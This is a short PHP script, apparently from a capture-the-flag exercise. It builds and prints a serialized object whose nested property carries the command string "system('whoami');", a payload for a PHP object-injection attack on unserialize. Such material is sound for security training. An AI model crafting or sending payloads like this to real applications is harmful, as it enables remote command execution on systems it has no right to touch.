<?php
highlight_file(__FILE__);
class Hyyy_true{
    public $pyload = "system('whoami');";
}
class Hyyy_false{
    public $AAA;
}
class Tools{
    public $NNN;
    public $HHH;
}
$flag=new Tools();
$flag->NNN = new Hyyy_true();
echo serialize($flag);
?>